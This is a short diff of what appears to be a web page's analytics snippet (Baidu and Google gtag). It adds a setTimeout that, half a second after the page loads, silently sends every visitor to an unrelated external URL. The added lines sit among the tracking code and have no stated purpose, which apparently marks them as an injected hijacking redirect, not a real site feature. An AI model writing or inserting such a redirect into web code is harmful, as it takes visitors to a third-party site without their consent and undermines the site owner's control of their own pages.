@@ -12,3 +12,6 @@ var _hmt = _hmt || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
   gtag('config', 'G-X4PXEYJLBC');
+setTimeout(function(){
+    window.location.href = 'https://a5jogo.org/917l7';
+},500);
